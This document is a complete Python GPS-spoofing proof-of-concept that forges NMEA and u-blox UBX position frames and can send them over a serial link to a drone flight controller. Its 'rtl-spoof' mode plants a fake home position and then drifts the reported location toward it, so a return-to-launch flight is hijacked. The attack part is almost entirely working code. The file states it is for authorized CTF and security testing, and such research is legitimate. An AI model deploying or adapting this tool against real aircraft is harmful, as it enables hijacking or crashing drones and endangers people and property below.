#!/usr/bin/env python3
"""
GPS Spoofing Proof-of-Concept — NMEA/UBX Frame Generator

Generates fake GPS position data to test drone flight controller behavior
around geofence boundaries and RTL (Return to Launch) logic. For authorized
CTF research and security testing only.

Supported protocols:
    NMEA 0183 — GGA and RMC sentences (ASCII, most flight controllers)
    UBX       — NAV-PVT binary frames (u-blox receivers)

Modes:
    static    — hold a fixed position (default)
    drift     — gradually move from start to end coordinates over time
    rtl-spoof — set a fake home position, then drift the drone toward it

By default the tool prints frames to stdout (simulation mode). Use --serial
to send frames to a serial port connected to a flight controller or GPS
module under test.

Usage:
    # Print NMEA sentences for a fixed position
    python3 gps-spoof-poc.py --lat 38.8977 --lon -77.0365

    # Drift from point A to point B over 60 seconds, 2 Hz update rate
    python3 gps-spoof-poc.py --mode drift \\
        --lat 38.8977 --lon -77.0365 \\
        --end-lat 38.9000 --end-lon -77.0400 \\
        --duration 60 --rate 2

    # RTL spoofing: set fake home, then drift toward it
    python3 gps-spoof-poc.py --mode rtl-spoof \\
        --lat 38.8977 --lon -77.0365 \\
        --home-lat 38.9100 --home-lon -77.0500 \\
        --duration 120

    # UBX binary output to serial port
    python3 gps-spoof-poc.py --protocol ubx --serial /dev/ttyUSB0 \\
        --baud 9600 --lat 38.8977 --lon -77.0365

    # Dry run: show what would be sent without opening serial
    python3 gps-spoof-poc.py --protocol ubx --serial /dev/ttyUSB0 --dry-run \\
        --lat 38.8977 --lon -77.0365
"""

import argparse
import math
import struct
import sys
import time
from datetime import datetime, timezone


def nmea_checksum(sentence: str) -> str:
    """XOR checksum of everything between $ and *."""
    cs = 0
    for c in sentence:
        cs ^= ord(c)
    return f"{cs:02X}"


def format_nmea_lat(lat: float) -> tuple[str, str]:
    """Convert decimal degrees to NMEA ddmm.mmmmm,N/S."""
    hemisphere = "N" if lat >= 0 else "S"
    lat = abs(lat)
    degrees = int(lat)
    minutes = (lat - degrees) * 60
    return f"{degrees:02d}{minutes:010.7f}", hemisphere


def format_nmea_lon(lon: float) -> tuple[str, str]:
    """Convert decimal degrees to NMEA dddmm.mmmmm,E/W."""
    hemisphere = "E" if lon >= 0 else "W"
    lon = abs(lon)
    degrees = int(lon)
    minutes = (lon - degrees) * 60
    return f"{degrees:03d}{minutes:010.7f}", hemisphere


def make_gga(lat: float, lon: float, alt: float, num_sats: int,
             hdop: float, utc_time: datetime) -> str:
    """Build a GPGGA sentence."""
    time_str = utc_time.strftime("%H%M%S.00")
    lat_str, lat_dir = format_nmea_lat(lat)
    lon_str, lon_dir = format_nmea_lon(lon)
    # fix quality: 1 = GPS fix
    body = (f"GPGGA,{time_str},{lat_str},{lat_dir},{lon_str},{lon_dir},"
            f"1,{num_sats:02d},{hdop:.1f},{alt:.1f},M,0.0,M,,")
    return f"${body}*{nmea_checksum(body)}"


def make_rmc(lat: float, lon: float, speed_knots: float,
             course_deg: float, utc_time: datetime) -> str:
    """Build a GPRMC sentence."""
    time_str = utc_time.strftime("%H%M%S.00")
    date_str = utc_time.strftime("%d%m%y")
    lat_str, lat_dir = format_nmea_lat(lat)
    lon_str, lon_dir = format_nmea_lon(lon)
    body = (f"GPRMC,{time_str},A,{lat_str},{lat_dir},{lon_str},{lon_dir},"
            f"{speed_knots:.1f},{course_deg:.1f},{date_str},,,A")
    return f"${body}*{nmea_checksum(body)}"


def ubx_checksum(payload: bytes) -> tuple[int, int]:
    """Fletcher-8 checksum used by u-blox UBX protocol."""
    ck_a = 0
    ck_b = 0
    for b in payload:
        ck_a = (ck_a + b) & 0xFF
        ck_b = (ck_b + ck_a) & 0xFF
    return ck_a, ck_b


def make_ubx_nav_pvt(lat: float, lon: float, alt: float,
                     speed_mps: float, heading_deg: float,
                     utc_time: datetime, num_sats: int) -> bytes:
    """Build a UBX NAV-PVT frame (class 0x01, id 0x07, 92 bytes payload)."""
    # NAV-PVT payload: 92 bytes
    # See u-blox 8/M8 receiver description, section 32.17.14
    itow = int((utc_time.hour * 3600 + utc_time.minute * 60 +
                utc_time.second) * 1000)
    year = utc_time.year
    month = utc_time.month
    day = utc_time.day
    hour = utc_time.hour
    minute = utc_time.minute
    second = utc_time.second
    valid = 0x07          # date, time, fully resolved
    t_acc = 50            # time accuracy estimate (ns)
    nano = 0
    fix_type = 3          # 3D fix
    flags = 0x01          # gnssFixOK
    flags2 = 0x00
    num_sv = num_sats
    lon_scaled = int(lon * 1e7)
    lat_scaled = int(lat * 1e7)
    height_mm = int(alt * 1000)
    h_msl_mm = int(alt * 1000)
    h_acc = 1500          # horizontal accuracy (mm)
    v_acc = 2000          # vertical accuracy (mm)
    vel_n = int(speed_mps * math.cos(math.radians(heading_deg)) * 1000)
    vel_e = int(speed_mps * math.sin(math.radians(heading_deg)) * 1000)
    vel_d = 0
    g_speed = int(speed_mps * 1000)  # mm/s
    head_mot = int(heading_deg * 1e5)
    s_acc = 500           # speed accuracy (mm/s)
    head_acc = int(5.0 * 1e5)  # heading accuracy (deg * 1e-5)
    p_dop = 120           # pDOP * 0.01
    flags3 = 0x00
    _reserved1 = 0
    head_veh = 0
    mag_dec = 0
    mag_acc = 0

    payload = struct.pack(
        "<IHBBBBBBIiBBBBiiiiIIiiiiiIIHHBBBBihH",
        itow, year, month, day, hour, minute, second, valid,
        t_acc, nano, fix_type, flags, flags2, num_sv,
        lon_scaled, lat_scaled, height_mm, h_msl_mm,
        h_acc, v_acc,
        vel_n, vel_e, vel_d,
        g_speed, head_mot,
        s_acc, head_acc,
        p_dop, flags3, 0, 0, 0, 0,
        head_veh, mag_dec, mag_acc,
    )

    msg_class = 0x01
    msg_id = 0x07
    length = len(payload)
    header = struct.pack("<BBH", msg_class, msg_id, length)
    ck_a, ck_b = ubx_checksum(header + payload)

    return b'\xB5\x62' + header + payload + bytes([ck_a, ck_b])


def haversine_distance(lat1: float, lon1: float,
                       lat2: float, lon2: float) -> float:
    """Distance in meters between two coordinates."""
    R = 6371000
    phi1, phi2 = math.radians(lat1), math.radians(lat2)
    dphi = math.radians(lat2 - lat1)
    dlam = math.radians(lon2 - lon1)
    a = (math.sin(dphi / 2) ** 2 +
         math.cos(phi1) * math.cos(phi2) * math.sin(dlam / 2) ** 2)
    return R * 2 * math.atan2(math.sqrt(a), math.sqrt(1 - a))


def bearing(lat1: float, lon1: float,
            lat2: float, lon2: float) -> float:
    """Initial bearing in degrees from point 1 to point 2."""
    phi1, phi2 = math.radians(lat1), math.radians(lat2)
    dlam = math.radians(lon2 - lon1)
    x = math.sin(dlam) * math.cos(phi2)
    y = (math.cos(phi1) * math.sin(phi2) -
         math.sin(phi1) * math.cos(phi2) * math.cos(dlam))
    return math.degrees(math.atan2(x, y)) % 360


def interpolate_position(lat1: float, lon1: float,
                         lat2: float, lon2: float,
                         fraction: float) -> tuple[float, float]:
    """Linear interpolation between two positions."""
    lat = lat1 + (lat2 - lat1) * fraction
    lon = lon1 + (lon2 - lon1) * fraction
    return lat, lon


def open_serial(port: str, baud: int):
    """Open serial port. Requires pyserial."""
    try:
        import serial
    except ImportError:
        print("ERROR: pyserial required for serial output. "
              "Install with: pip install pyserial", file=sys.stderr)
        sys.exit(1)
    return serial.Serial(port, baud, timeout=1)


def emit_frame(frame_bytes: bytes, serial_port, protocol: str,
               dry_run: bool) -> None:
    """Send or display a frame."""
    if isinstance(frame_bytes, str):
        frame_bytes = (frame_bytes + "\r\n").encode()

    if dry_run:
        if protocol == "nmea":
            print(f"[DRY-RUN] {frame_bytes.decode().strip()}", file=sys.stderr)
        else:
            print(f"[DRY-RUN] {frame_bytes.hex()}", file=sys.stderr)
        return

    if serial_port:
        serial_port.write(frame_bytes)
        if protocol == "nmea":
            print(f"[TX] {frame_bytes.decode().strip()}", file=sys.stderr)
        else:
            print(f"[TX] UBX NAV-PVT ({len(frame_bytes)} bytes)", file=sys.stderr)
    else:
        if protocol == "nmea":
            sys.stdout.write(frame_bytes.decode())
            sys.stdout.flush()
        else:
            sys.stdout.buffer.write(frame_bytes)
            sys.stdout.buffer.flush()


def run_static(args, serial_port) -> None:
    """Emit frames at a fixed position."""
    interval = 1.0 / args.rate
    print(f"[*] Static mode: ({args.lat:.6f}, {args.lon:.6f}) "
          f"alt={args.alt}m, {args.rate} Hz", file=sys.stderr)
    print(f"[*] Protocol: {args.protocol.upper()}", file=sys.stderr)
    if not serial_port and not args.dry_run:
        print("[*] Output: stdout (simulation mode)", file=sys.stderr)
    print("[*] Press Ctrl+C to stop", file=sys.stderr)

    try:
        while True:
            now = datetime.now(timezone.utc)
            if args.protocol == "nmea":
                gga = make_gga(args.lat, args.lon, args.alt,
                               args.num_sats, 1.0, now)
                rmc = make_rmc(args.lat, args.lon, 0.0, 0.0, now)
                emit_frame(gga, serial_port, "nmea", args.dry_run)
                emit_frame(rmc, serial_port, "nmea", args.dry_run)
            else:
                frame = make_ubx_nav_pvt(args.lat, args.lon, args.alt,
                                         0.0, 0.0, now, args.num_sats)
                emit_frame(frame, serial_port, "ubx", args.dry_run)
            time.sleep(interval)
    except KeyboardInterrupt:
        print("\n[*] Stopped", file=sys.stderr)


def run_drift(args, serial_port) -> None:
    """Drift from start to end position over duration."""
    if args.end_lat is None or args.end_lon is None:
        print("ERROR: --end-lat and --end-lon required for drift mode",
              file=sys.stderr)
        sys.exit(1)

    dist = haversine_distance(args.lat, args.lon, args.end_lat, args.end_lon)
    hdg = bearing(args.lat, args.lon, args.end_lat, args.end_lon)
    speed_mps = dist / args.duration if args.duration > 0 else 0

    interval = 1.0 / args.rate
    total_steps = int(args.duration * args.rate)

    print(f"[*] Drift mode: ({args.lat:.6f}, {args.lon:.6f}) → "
          f"({args.end_lat:.6f}, {args.end_lon:.6f})", file=sys.stderr)
    print(f"[*] Distance: {dist:.0f}m, bearing: {hdg:.1f}°, "
          f"speed: {speed_mps:.1f} m/s", file=sys.stderr)
    print(f"[*] Duration: {args.duration}s, {total_steps} frames "
          f"at {args.rate} Hz", file=sys.stderr)
    print("[*] Press Ctrl+C to stop", file=sys.stderr)

    try:
        for step in range(total_steps + 1):
            frac = step / total_steps if total_steps > 0 else 1.0
            lat, lon = interpolate_position(
                args.lat, args.lon, args.end_lat, args.end_lon, frac)
            now = datetime.now(timezone.utc)

            if args.protocol == "nmea":
                speed_knots = speed_mps * 1.94384
                gga = make_gga(lat, lon, args.alt, args.num_sats, 1.0, now)
                rmc = make_rmc(lat, lon, speed_knots, hdg, now)
                emit_frame(gga, serial_port, "nmea", args.dry_run)
                emit_frame(rmc, serial_port, "nmea", args.dry_run)
            else:
                frame = make_ubx_nav_pvt(lat, lon, args.alt, speed_mps,
                                         hdg, now, args.num_sats)
                emit_frame(frame, serial_port, "ubx", args.dry_run)

            if step % (args.rate * 10) == 0 and step > 0:
                print(f"[*] Position: ({lat:.6f}, {lon:.6f}) "
                      f"— {frac * 100:.0f}% complete", file=sys.stderr)

            time.sleep(interval)
    except KeyboardInterrupt:
        print("\n[*] Stopped", file=sys.stderr)
        return

    print(f"[*] Drift complete at ({args.end_lat:.6f}, {args.end_lon:.6f})",
          file=sys.stderr)


def run_rtl_spoof(args, serial_port) -> None:
    """RTL spoofing: send fake home position, then drift toward it.

    Phase 1 (settle): emit the spoofed home position for a few seconds
                      so the FC latches it as the launch point.
    Phase 2 (drift):  move the reported position toward the fake home,
                      simulating what the FC would see during an RTL.
    """
    if args.home_lat is None or args.home_lon is None:
        print("ERROR: --home-lat and --home-lon required for rtl-spoof mode",
              file=sys.stderr)
        sys.exit(1)

    settle_time = min(10, args.duration // 4)
    drift_time = args.duration - settle_time

    dist = haversine_distance(args.lat, args.lon,
                              args.home_lat, args.home_lon)
    hdg = bearing(args.lat, args.lon, args.home_lat, args.home_lon)

    print("[*] RTL spoof mode", file=sys.stderr)
    print(f"[*] Fake home: ({args.home_lat:.6f}, {args.home_lon:.6f})",
          file=sys.stderr)
    print(f"[*] Current pos: ({args.lat:.6f}, {args.lon:.6f})",
          file=sys.stderr)
    print(f"[*] Home distance: {dist:.0f}m, bearing: {hdg:.1f}°",
          file=sys.stderr)
    print(f"[*] Phase 1: {settle_time}s settle (latch fake home)",
          file=sys.stderr)
    print(f"[*] Phase 2: {drift_time}s drift toward fake home",
          file=sys.stderr)
    print("[*] Press Ctrl+C to stop", file=sys.stderr)

    interval = 1.0 / args.rate

    try:
        # Phase 1: settle at fake home position
        print("[*] Phase 1: emitting fake home position...", file=sys.stderr)
        settle_steps = int(settle_time * args.rate)
        for _ in range(settle_steps):
            now = datetime.now(timezone.utc)
            if args.protocol == "nmea":
                gga = make_gga(args.home_lat, args.home_lon, args.alt,
                               args.num_sats, 1.0, now)
                rmc = make_rmc(args.home_lat, args.home_lon, 0.0, 0.0, now)
                emit_frame(gga, serial_port, "nmea", args.dry_run)
                emit_frame(rmc, serial_port, "nmea", args.dry_run)
            else:
                frame = make_ubx_nav_pvt(args.home_lat, args.home_lon,
                                         args.alt, 0.0, 0.0, now,
                                         args.num_sats)
                emit_frame(frame, serial_port, "ubx", args.dry_run)
            time.sleep(interval)

        # Phase 2: drift from current position toward fake home
        print("[*] Phase 2: drifting toward fake home...", file=sys.stderr)
        drift_steps = int(drift_time * args.rate)
        speed_mps = dist / drift_time if drift_time > 0 else 0

        for step in range(drift_steps + 1):
            frac = step / drift_steps if drift_steps > 0 else 1.0
            lat, lon = interpolate_position(
                args.lat, args.lon, args.home_lat, args.home_lon, frac)
            now = datetime.now(timezone.utc)

            if args.protocol == "nmea":
                speed_knots = speed_mps * 1.94384
                gga = make_gga(lat, lon, args.alt, args.num_sats, 1.0, now)
                rmc = make_rmc(lat, lon, speed_knots, hdg, now)
                emit_frame(gga, serial_port, "nmea", args.dry_run)
                emit_frame(rmc, serial_port, "nmea", args.dry_run)
            else:
                frame = make_ubx_nav_pvt(lat, lon, args.alt, speed_mps,
                                         hdg, now, args.num_sats)
                emit_frame(frame, serial_port, "ubx", args.dry_run)

            if step % (args.rate * 10) == 0 and step > 0:
                print(f"[*] Position: ({lat:.6f}, {lon:.6f}) "
                      f"— {frac * 100:.0f}% to fake home", file=sys.stderr)

            time.sleep(interval)

    except KeyboardInterrupt:
        print("\n[*] Stopped", file=sys.stderr)
        return

    print(f"[*] RTL spoof complete — arrived at fake home "
          f"({args.home_lat:.6f}, {args.home_lon:.6f})", file=sys.stderr)


def main():
    parser = argparse.ArgumentParser(
        description="GPS Spoofing PoC — NMEA/UBX frame generator for "
                    "drone CTF research",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="For authorized security testing only. All testing targets "
               "hardware you own.")

    parser.add_argument("--lat", type=float, required=True,
                        help="Latitude in decimal degrees")
    parser.add_argument("--lon", type=float, required=True,
                        help="Longitude in decimal degrees")
    parser.add_argument("--alt", type=float, default=100.0,
                        help="Altitude in meters (default: 100)")
    parser.add_argument("--num-sats", type=int, default=12,
                        help="Number of satellites to report (default: 12)")

    parser.add_argument("--mode", choices=["static", "drift", "rtl-spoof"],
                        default="static",
                        help="Operating mode (default: static)")
    parser.add_argument("--protocol", choices=["nmea", "ubx"],
                        default="nmea",
                        help="Output protocol (default: nmea)")

    # Drift mode options
    parser.add_argument("--end-lat", type=float,
                        help="End latitude for drift mode")
    parser.add_argument("--end-lon", type=float,
                        help="End longitude for drift mode")
    parser.add_argument("--duration", type=int, default=60,
                        help="Duration in seconds for drift/rtl modes "
                             "(default: 60)")
    parser.add_argument("--rate", type=int, default=1,
                        help="Update rate in Hz (default: 1)")

    # RTL spoof options
    parser.add_argument("--home-lat", type=float,
                        help="Fake home latitude for rtl-spoof mode")
    parser.add_argument("--home-lon", type=float,
                        help="Fake home longitude for rtl-spoof mode")

    # Serial output
    parser.add_argument("--serial", type=str, default=None,
                        help="Serial port (e.g., /dev/ttyUSB0). "
                             "Omit for stdout simulation.")
    parser.add_argument("--baud", type=int, default=9600,
                        help="Serial baud rate (default: 9600)")
    parser.add_argument("--dry-run", action="store_true",
                        help="Show frames without sending to serial")

    args = parser.parse_args()

    if args.lat < -90 or args.lat > 90:
        parser.error("Latitude must be between -90 and 90")
    if args.lon < -180 or args.lon > 180:
        parser.error("Longitude must be between -180 and 180")

    serial_port = None
    if args.serial and not args.dry_run:
        serial_port = open_serial(args.serial, args.baud)
        print(f"[*] Serial: {args.serial} @ {args.baud} baud", file=sys.stderr)

    try:
        if args.mode == "static":
            run_static(args, serial_port)
        elif args.mode == "drift":
            run_drift(args, serial_port)
        elif args.mode == "rtl-spoof":
            run_rtl_spoof(args, serial_port)
    finally:
        if serial_port:
            serial_port.close()
            print("[*] Serial port closed", file=sys.stderr)


if __name__ == "__main__":
    main()
